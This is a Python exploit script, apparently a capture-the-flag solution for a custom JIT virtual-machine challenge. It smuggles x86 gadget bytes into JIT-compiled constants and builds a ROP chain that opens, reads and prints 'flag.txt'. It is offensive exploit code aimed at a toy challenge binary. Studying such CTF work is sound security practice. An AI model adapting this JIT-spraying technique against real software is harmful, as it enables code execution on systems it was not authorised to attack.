# flake8: noqa
#!/usr/bin/env python3
from dn3 import *
from kowaii import kowaiiBin

exe = ELF("kowaiiVm.dbg")

ctx.binary = exe
ctx.terminal = "kitty".split()
ctx.log = 0
#ctx.aslr = False

global io
breakpoints = '''
break jitEnc
break jitCall
'''+"continue\n"*1

host, port = "localhost",1337

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(host,port)
elif len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb(exe.path, gdbscript=breakpoints)
    
DeathNot3(io)


def push_addr(offset):
    return f"""
    mov x4, {offset}
    add x3, x2, x4
    push x3
    """

def push_imm(imm):
    return f"""
    mov x4, {imm}
    push x4
    """

kb = kowaiiBin(entry = 0x1000, bss = 0xc000)

kb.addConst(0x5b40000000001b8, 0x300)
kb.addConst(0x5b401b9bcbcbcbc, 0x308)
kb.addConst(upk("flag.txt"), 0x310)

_pop_rdi_rsi_rdx_ret = upk("\x5f\x5e\x5a\xc3") # 0x1d
_pop_rax_syscall_ret = upk("\x58\x0f\x05\xc3") # 0x23

pop_rdi_rsi_rdx_ret = 0x1d
pop_rax_syscall_ret = 0x23

kb.addFunc("en", 0x1000, f"""

    mov x1, 0x1     
    {'''
        call ab
        get x1, 0x300
        set x1, 0x0
     '''*11}
    hlt
""")

ropchain = [
    push_addr(pop_rax_syscall_ret),
    push_imm(2),
    push_addr(pop_rdi_rsi_rdx_ret),
    push_imm(0),
    "push x5",
    push_imm(0x40),
    push_addr(pop_rax_syscall_ret),
    push_imm(0),
    push_addr(pop_rdi_rsi_rdx_ret),
    push_imm(1),
    "push x5",
    push_imm(0x40),
    push_addr(pop_rax_syscall_ret),
    push_imm(1)
]

kb.addFunc("ab", 0xbff0, f"""
    get x1, 0x308
    nop * 10
    set x1, 0x0
    shl x5, 0xff
    ret
    get x2, 0xffff401d
    get x5, 0xffff4011
    mov x0, {_pop_rdi_rsi_rdx_ret}
    mov x0, {_pop_rax_syscall_ret}
    mov x1, 0xb310
    add x5, x1, x5

    {chr(0xa).join(ropchain[::-1])}

    mov x4, 0x0
    push x4
    push x4
    push x5
    {push_addr(pop_rdi_rsi_rdx_ret)}
    ret
""")

print(len(kb.funcEntries[0xbff0]["code"]))

sla("> ", kb.raw())
pause()
sla("> ", "y")

shell()